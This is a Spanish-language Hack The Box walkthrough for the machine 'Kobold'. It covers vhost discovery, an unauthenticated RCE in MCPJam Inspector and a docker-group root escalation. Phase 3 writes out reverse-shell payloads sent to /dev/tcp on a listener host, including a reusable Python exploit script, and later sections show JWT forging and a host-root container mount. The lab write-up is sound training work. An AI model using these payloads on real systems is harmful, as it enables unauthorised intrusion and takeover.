---
title: "HTB Kobold - Write-Up"
date: 2026-11-11
categories: [Hack The Box]
tags: [wildcard-vhost-enumeration, mcpjam-rce, arcane, privatebin, systemd-env-leak, docker-group-privesc]
---

## Introducción

Kobold es una máquina Linux centrada en descubrir un vhost oculto detrás de un *wildcard vhost* que redirige (301) cualquier Host a la misma respuesta, explotar una RCE no autenticada en **MCPJam Inspector** integrado en el backend de **Arcane** (gestor de contenedores Docker), y escalar privilegios aprovechando que el usuario de la shell pertenece al grupo `docker` sin que `id` lo refleje en la sesión activa.

**Ruta general:** escaneo completo de puertos (22, 80, 443, 3552) sobre `10.129.245.50` → descubrimiento de vhosts tras un servidor que responde 301 a cualquier Host (técnica de diferenciación de contenido + wordlist contextual en lugar de diccionarios genéricos) → identificación de `mcp.kobold.htb`, que expone **MCPJam Inspector** integrado en el backend de Arcane v1.13.0 → RCE no autenticada (**CVE-2026-23744**) en `POST /api/mcp/connect` → shell como `ben` → enumeración del grupo `operator` y de una instalación de PrivateBin con ficheros `777` propiedad de `root:operator` (vía explorada y descartada: nginx no interpreta `.htaccess`, y el contenedor de PrivateBin tiene su propio filesystem aislado) → hallazgo de `/etc/systemd/system/arcane.service` (legible por todos), que confirma que Arcane corre como `root` y filtra una variable `ENCRYPTION_KEY` (vía de forja de JWT explorada y descartada: el token firmado con esa clave sólo es válido para endpoints públicos como `/api/version`, no para la API de administración) → escalada real: se observa a `root` interactuando con un contenedor Docker en `ps aux`, y `/etc/group` confirma que `ben` pertenece al grupo `docker` aunque la sesión activa no lo refleje → `newgrp docker` → `docker run` montando la raíz del host con una imagen local (sin salida a Internet) → `chroot` al host como root.

## Fase 1 — Reconocimiento

Escaneo completo de puertos TCP sobre la IP de la máquina (`10.129.245.50`), seguido de un escaneo de versión/scripts dirigido a los puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.245.50 -oN Ports
```

```bash
nmap -p22,80,443,3552 -sCV 10.129.245.50 -oN Vports
```

```
22/tcp   open  ssh
80/tcp   open  http      (redirige a 443)
443/tcp  open  ssl/http
3552/tcp open  http      Golang net/http server
```

> **Punto clave:** cuatro puertos abiertos — SSH, el par HTTP/HTTPS habitual con redirect 80→443, y un puerto no estándar (3552) que resulta ser un servidor Go. Ese puerto fuera de lo común es la primera pista de que ahí vive la aplicación real (Arcane), mientras que 80/443 sirven solo el vhost principal.

## Fase 2 — Vhost oculto tras un wildcard

El 80 redirige a 443, y el código fuente de la página en 443 filtra el correo `admin@kobold.htb`, indicio de vhosting por nombre. El puerto 3552 sirve una SPA de SvelteKit bajo el nombre **Arcane v1.13.0** (gestor de contenedores Docker), accesible forzando el header `Host`:

```bash
curl -i -H "Host: kobold.htb" http://10.129.245.50:3552/
```

Un fuzzing de subdominios contra la raíz web devuelve el mismo código y tamaño para absolutamente cualquier palabra:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://kobold.htb/ -H "Host: FUZZ.kobold.htb"
```

```
Status: 301, Size: 178, Words: 6, Lines: 8   (para prácticamente todas las entradas)
```

Con cualquiera de estas técnicas aparece `mcp.kobold.htb`. Se añade a `/etc/hosts` junto al dominio principal:

```bash
echo "10.129.245.50  kobold.htb mcp.kobold.htb" | sudo tee -a /etc/hosts
```

## Fase 3 — RCE no autenticada en MCPJam Inspector (CVE-2026-23744)

MCPJam Inspector expone el endpoint `POST /api/mcp/connect`, que acepta un JSON con la configuración de un servidor MCP a conectar — incluyendo el comando a ejecutar — sin ninguna autenticación ni validación:

```bash
# listener
nc -lvnp 4444

# payload
curl -i -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "local",
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/<IP_TUN0>/4444 0>&1"]
    }
  }'
```

> **Por qué funciona:** el endpoint lanza el proceso especificado en `serverConfig.command`/`args` tal cual, interpretándolo como el arranque de un servidor MCP local, sin sandboxing ni lista blanca de binarios. Al apuntar `command` directamente a `/bin/bash` con `args` arbitrarios se obtiene ejecución de comandos arbitraria sin credenciales. (Nota: hay que usar HTTPS directamente — `curl` no sigue redirecciones 301 en peticiones POST preservando el body, y el vhost principal en el puerto 80 redirige siempre a 443).

Alternativa en forma de script, parametrizando host/puerto de la víctima y del listener:

```python
import requests
import sys

if len(sys.argv) != 5:
    print(f"Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport>")
    sys.exit(1)

rhost, rport, lhost, lport = sys.argv[1:5]
url = f"https://{rhost}:{rport}/api/mcp/connect"
payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

data = {
    "serverConfig": {
        "command": "bash",
        "args": ["-c", payload],
        "env": {}
    },
    "serverId": "exploit"
}

requests.post(url, json=data, verify=False, timeout=5)
```

```bash
python3 exploit.py 10.129.245.50 3552 10.10.14.44 4444
```

El Netcat recibe la conexión como el usuario `ben`. Se estabiliza la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Flag de usuario

```bash
cat /home/ben/user.txt
```

## Fase 4 — Enumeración como `ben`: grupo `operator` y PrivateBin (descartado)

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
sudo -l
# [sudo] password for ben:  (desconocida, vía descartada)
```

`ben` pertenece al grupo poco habitual `operator` (GID 37). Buscando ficheros de ese grupo aparece una instalación de **PrivateBin**:

```bash
find / -group operator -type f 2>/dev/null
```

```
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/.htaccess
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
```

```bash
ls -la /privatebin-data/data/
```

```
-rwxrwxrwx 1 root operator   19 Feb 16 2026 .htaccess
-rwxrwxrwx 1 root operator  522 Feb 16 2026 salt.php
-rw-r----- 1 root operator  132 Feb 16 2026 traffic_limiter.php
-rwxrwxrwx 1 root operator   47 Mar  4 2026 purge_limiter.php
```

`salt.php` y `purge_limiter.php` tienen permisos `777` y pertenecen a `root`. La configuración de nginx (`/etc/nginx/sites-available/default`) confirma que PHP se ejecuta vía `php8.3-fpm.sock`, y que `docker-proxy` reenvía `127.0.0.1:8080` a un contenedor (`172.17.0.2:8080`) que resulta ser esa misma instancia de PrivateBin:

```bash
cat /etc/nginx/sites-available/default
# fastcgi_pass unix:/run/php/php8.3-fpm.sock;
ps aux | grep root
# root ... /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
```

> **Nota — vía explorada y descartada:** sobrescribir `purge_limiter.php`/`salt.php` con una reverse shell PHP y forzar su ejecución mediante symlink (`ln -s .../pwn.php /var/www/html/pwn.php`), path traversal (`/../../../privatebin-data/data/pwn.php`) o `auto_prepend_file` vía `.htaccess` no da resultado por dos motivos: **nginx no interpreta `.htaccess`** (es una directiva exclusiva de Apache, y `AllowOverride` no aplica aquí), y `/var/www/html` no es escribible por `ben`. Invocar directamente el script modificado a través de la RCE de MCPJam (`php /privatebin-data/data/purge_limiter.php`) solo lo ejecuta como `ben`, no como root. El contenedor de PrivateBin en el puerto 8080 responde con el mismo contenido que `bin.kobold.htb`, pero tiene su propio filesystem aislado: escribir en `/privatebin-data/data/` desde el host no modifica lo que el contenedor realmente sirve.

## Fase 5 — Filtración de `arcane.service` y forja de JWT (descartado)

```bash
ls -la /etc/systemd/system/arcane.service
# -rw-r--r-- 1 root root 277 Feb 15 2026
cat /etc/systemd/system/arcane.service
```

```ini
[Unit]
Description=Arcane Service
After=network.target

[Service]
Type=simple
Environment=ENCRYPTION_KEY="Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E="
ExecStart=/root/arcane_linux_amd64
Restart=on-failure
User=root
WorkingDirectory=/root

[Install]
WantedBy=multi-user.target
```

El fichero confirma que Arcane corre literalmente como `root` y filtra su `ENCRYPTION_KEY`. Con ella se puede forjar un JWT firmado en HS256 para el usuario `admin`:

```bash
#!/bin/bash
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"username":"admin","email":"admin@kobold.htb","exp":1794421296}' | base64 | tr -d '=' | tr '/+' '_-')
KEY="Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E="
SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "$KEY" -binary | base64 | tr -d '=' | tr '/+' '_-')
echo "$HEADER.$PAYLOAD.$SIGNATURE"
```

```bash
curl -i -H "Authorization: Bearer <TOKEN>" http://kobold.htb:3552/api/version
# HTTP/1.1 200 OK  → el token es criptográficamente válido
```

> **Nota — vía explorada y descartada:** el token forjado es aceptado por el endpoint público `/api/version`, pero devuelve `401 Unauthorized` en cualquier endpoint de administración (`/api/environments/0/projects`, `/api/api-keys`...), incluso añadiendo `"roles": ["admin"]` al payload. Arcane valida esos endpoints con un mecanismo distinto al JWT firmado con `ENCRYPTION_KEY` (probablemente una cookie de sesión opaca), por lo que esta clave no es el vector de escalada real pese a parecer muy prometedora.

## Fase 6 — Escalada de privilegios real: grupo `docker` oculto

Revisando los procesos en ejecución se observa a `root` interactuando activamente con un contenedor Docker — indicio claro de que Docker puede ser la vía de escalada:

```bash
ps aux | grep docker
# root ... containerd-shim-runc-v2 ...
# root ... /usr/bin/docker-proxy -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
```

Un primer intento con `docker ps` falla porque `ben` no tiene acceso directo al socket del demonio. `/etc/group` confirma que, aunque la sesión activa no lo refleje, `ben` sí es miembro del grupo `docker` (GID 998):

```bash
docker ps
# permission denied while trying to connect to the Docker daemon socket
grep docker /etc/group
# docker:x:998:ben
newgrp docker
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),998(docker)
```

> **Por qué funciona:** `newgrp` abre una subshell con el grupo indicado activado, sin necesitar contraseña cuando el usuario ya figura como miembro en `/etc/group`. La shell original de la reverse shell nunca pasó por un proceso de login que recalculara los grupos, así que el grupo `docker` quedaba "dormido" hasta forzarlo explícitamente. Pertenecer al grupo `docker` equivale en la práctica a tener root en el host: cualquier miembro puede montar el filesystem raíz del host dentro de un contenedor que arranca como UID 0.

Con el grupo `docker` activo se intenta el escape clásico, pero la máquina no tiene salida a Internet:

```bash
docker run -v /:/host --rm -it alpine chroot /host bash
# Unable to find image 'alpine:latest' locally   (sin red, se cuelga)
```

El propio error confirma que el acceso al grupo `docker` es real. Se usa una imagen ya presente localmente en vez de `alpine`:

```bash
docker images
```

```
REPOSITORY                    TAG       IMAGE ID       CREATED         SIZE
mysql                         latest    f66b7a288113   9 months ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   12 months ago   122MB
```

```bash
docker run -v /:/host --rm -it mysql bash
whoami
# root
```

Dentro del contenedor, la raíz real del host queda montada en `/host`:

```bash
cd /host/root
cat root.txt
```
